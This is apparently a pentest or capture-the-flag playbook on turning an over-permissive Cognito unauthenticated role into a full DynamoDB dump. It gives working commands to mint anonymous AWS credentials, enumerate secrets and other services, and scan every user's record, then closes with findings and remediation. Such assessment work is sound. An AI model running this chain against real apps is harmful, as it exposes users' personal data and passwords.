# Cognito Unauthenticated Identity Pool to DynamoDB Dump

Target pattern: a static, login-free web app hosted on [[Security-Terms#^s3|S3]] that still shows per-user data. The app obtains real AWS credentials in the browser from a Cognito Identity Pool configured to allow unauthenticated identities. The vulnerability is not Cognito itself — it is the [[Security-Terms#^iam|IAM]] policy on the unauth role being scoped too broadly (table-wide read instead of own-record read). The chain below turns "any anonymous visitor" into "every user's record".

## Confirm the app ships logic to the browser

```bash
curl -s http://<bucket>.s3-website-<region>.amazonaws.com/
```

- `-s` → silent: drop the progress meter so the HTML is the only output.
- the endpoint hostname → it hands you two things for free: the **region** (`s3-website-us-east-1`) and often the 12-digit **AWS account ID** embedded in the bucket name (`app-<account-id>`). Record both.

## Pull the AWS config out of the bundle

```bash
curl -s http://<target>/app.js | grep -iE "us-east-1|identitypool|region|tablename|apigateway|cognito"
```

- `grep -iE` → case-insensitive extended regex; anchor on the **region string** first because in an SDK config the region sits beside the pool ID and table name, so a hit drags the rest into view within a few lines.

Values worth extracting: `IdentityPoolId` (format `<region>:<uuid>`), `AWS_REGION`, `TABLE_NAME`, and any `UserPoolId`, API Gateway base URL, or S3 bucket name.

## Mint anonymous AWS credentials

```bash
aws cognito-identity get-id --identity-pool-id <region>:<uuid> --region <region> --output json
```

```bash
aws cognito-identity get-credentials-for-identity --identity-id <region>:<uuid> --region <region> --output json
```

- no credentials and no `--no-sign-request` → both calls are unauthenticated **by design**; that is the whole vulnerability, so do not add auth.
- `get-id` returns an `IdentityId`; feed it to `get-credentials-for-identity`, which returns `AccessKeyId`, `SecretKey`, `SessionToken`, `Expiration`.
- `--output json` → include it explicitly; a broken CLI default is the first gotcha below.

## Load the keys and confirm who you are

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
```

```bash
export AWS_SECRET_ACCESS_KEY="..."
```

```bash
export AWS_SESSION_TOKEN="..."
```

```bash
aws sts get-caller-identity
```

- all three `export`s → environment variables take precedence over `~/.aws/credentials`, so this leaves any existing profile untouched. **`AWS_SESSION_TOKEN` is not optional** for `ASIA` keys; omit it and every call fails signature validation with a confusing `InvalidClientTokenId`.
- `get-caller-identity` → costs nothing, needs no permission, and confirms the keys work before you build on them.

## Map what the role can actually reach

```bash
aws dynamodb list-tables --region <region>
```

```bash
aws dynamodb describe-table --table-name <table> --region <region>
```

```bash
aws iam get-role --role-name <role>
```

```bash
aws iam list-role-policies --role-name <role>
```

```bash
aws iam list-attached-role-policies --role-name <role>
```

```bash
aws s3 ls
```

```bash
aws lambda list-functions
```

```bash
aws secretsmanager list-secrets
```

- `list-tables` → does the role see tables beyond the one hardcoded in the JS? Broader visibility than the app uses is the first sign of over-scoping.
- the `iam` calls → usually denied for an unauth role, but always worth one call: a role that can read its own policy tells you exactly where the boundary is. `list-role-policies` shows only inline policies and `list-attached-role-policies` only managed ones; run both, or a loaded role can look empty.
- the `s3`/`lambda`/`secretsmanager` line → quick breadth checks for other services the same over-scoped policy may cover.

## Dump the table

```bash
aws dynamodb scan --table-name <table> --region <region> --output json > scan.json
```

- `> scan.json` → redirect rather than page; a large scan opens in a pager where `:` means more output follows and it is easy to think the command hung. A file is also your evidence.
- `Scan` reads **every** item before any filter is applied, so it both proves the finding and consumes read capacity regardless of what you keep.

Flatten DynamoDB's typed attributes into readable lines, and filter server-side only if the table is too large to eyeball:

```bash
jq -r '.Items[] | .guest_id.S + " | " + .name.S + " | " + .notes.S' scan.json
```

```bash
aws dynamodb scan --table-name <table> --region <region> --filter-expression "contains(notes, :f)" --expression-attribute-values '{":f":{"S":"FLAG{"}}'
```

## Reportable findings from this pattern

1. Cognito Identity Pool permits unauthenticated identities and issues live AWS credentials to any anonymous caller.
2. The unauth IAM role grants `dynamodb:Scan` over the whole table, letting any visitor read every other user's record — a horizontal authorization failure (IDOR at the IAM layer).
3. Passwords stored in plaintext in the `password` attribute. Independent finding; critical on its own.
4. [[Security-Terms#^pii|PII]] exposed at scale: email addresses, phone numbers, and precise `location` coordinates for all users.
5. Authorization enforced by a client-generated `localStorage` identifier — attacker-controlled, therefore no control at all.

## Remediation notes

Scope the unauth role to `dynamodb:GetItem` on the specific table, with an IAM condition binding the partition key to `${cognito-identity.amazonaws.com:sub}` so each identity can only read its own item. Remove `Scan` entirely. Disable unauthenticated access on the pool if the app can require sign-in. Hash passwords; never store credentials as a table attribute. Move any query the client cannot be trusted to build behind an authenticated API layer.
